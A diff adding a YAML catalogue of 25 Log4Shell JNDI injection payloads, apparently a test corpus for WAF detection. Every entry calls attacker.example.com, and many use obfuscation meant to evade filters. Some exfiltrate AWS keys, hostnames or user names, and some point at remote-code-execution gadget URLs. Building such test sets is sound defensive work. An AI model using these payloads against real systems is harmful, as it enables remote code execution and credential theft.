@@ -1,0 +1,183 @@
+# JNDI / Log4Shell (CVE-2021-44228) — 25 entries. WAF-view only.
+# Sources: PayloadsAllTheThings/CVE-2021-44228/Log4Shell, 0xsyr0 Payloads-
+# Obfuscation-WAF-Bypass catalogue, Puliczek's log4j bypass list,
+# JFrog research on log4j obfuscation patterns.
+
+- id: jndi-basic
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com/a}"
+  trigger: &T200 { kind: status, code: 200 }
+  cwe: CWE-502
+  source: "PayloadsAllTheThings — canonical JNDI"
+
+- id: jndi-rmi
+  class: jndi
+  payload: "${jndi:rmi://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "RMI variant"
+
+- id: jndi-dns
+  class: jndi
+  payload: "${jndi:dns://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "DNS variant (leak)"
+
+- id: jndi-ldaps
+  class: jndi
+  payload: "${jndi:ldaps://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "LDAPS variant"
+
+- id: jndi-corba
+  class: jndi
+  payload: "${jndi:corbaname://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "CORBA naming variant"
+
+- id: jndi-iiop
+  class: jndi
+  payload: "${jndi:iiop://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "IIOP variant"
+
+# --- obfuscation round 1: lower/upper lookups --------------------------------
+- id: jndi-lower
+  class: jndi
+  payload: "${${lower:j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — lower lookup"
+
+- id: jndi-upper
+  class: jndi
+  payload: "${${upper:j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — upper-on-lower (no-op but defeats simple regex)"
+
+- id: jndi-upper-dotless
+  class: jndi
+  payload: "${${upper:ı}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — dotless i normalises to i"
+
+# --- obfuscation round 2: char-at-a-time -----------------------------------
+- id: jndi-nested-char
+  class: jndi
+  payload: "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — default-value expansion"
+
+- id: jndi-nested-char-mixed
+  class: jndi
+  payload: "${${::-j}${::-n}${${lower:D}}${${upper:i}}:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — mixed default + case lookups"
+
+- id: jndi-env-resolver
+  class: jndi
+  payload: "${${env:UNDEFINED:-j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — env fallback"
+
+- id: jndi-sys-resolver
+  class: jndi
+  payload: "${${sys:undefined:-j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — sys-property fallback"
+
+- id: jndi-date-resolver
+  class: jndi
+  payload: "${${date:j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — date lookup passthrough"
+
+- id: jndi-marker-resolver
+  class: jndi
+  payload: "${${marker:j}ndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Obfuscation — non-existent lookup falls through"
+
+# --- exfil wrapped in the LDAP path ----------------------------------------
+- id: jndi-exfil-env
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com/a=${env:AWS_ACCESS_KEY_ID}}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Puliczek — env-based exfil"
+
+- id: jndi-exfil-hostname
+  class: jndi
+  payload: "${jndi:ldap://${hostName}.attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Canary via DNS subdomain"
+
+- id: jndi-exfil-sys-user
+  class: jndi
+  payload: "${jndi:ldap://${sys:user.name}.attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "OS user via sys: lookup → DNS exfil"
+
+- id: jndi-base64-prefix
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com/${base64:U29tZVBheWxvYWQ=}}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Base64 lookup wrapper"
+
+- id: jndi-uri-encoded
+  class: jndi
+  payload: "%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example.com%2Fa%7D"
+  trigger: *T200
+  cwe: CWE-502
+  source: "URL-encoded canonical (defeats string-match WAFs)"
+
+- id: jndi-html-entity
+  class: jndi
+  payload: "&dollar;{jndi:ldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "HTML-entity dollar — round-trip via reflectors"
+
+# --- log4j 2.15+ requirement: ldap.allowedJndiProtocols bypass attempts -----
+- id: jndi-host-port
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com:1389/Basic/Command/Base64/cm0=}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Standard exec gadget URL"
+
+- id: jndi-deserial-rce
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com:1389/Deserialization/CommonsCollections5/Sleep/0}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "JNDI-Exploit-Kit deserialization gadget"
+
+- id: jndi-spel-vuln
+  class: jndi
+  payload: "${jndi:ldap://attacker.example.com/${spring:user.name}}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Spring SpEL → JNDI chain (CVE-2022-22965 inspired)"
+
+- id: jndi-newline-split
+  class: jndi
+  payload: "${jndi:\nldap://attacker.example.com/a}"
+  trigger: *T200
+  cwe: CWE-502
+  source: "Newline-split protocol — defeats single-line regex"
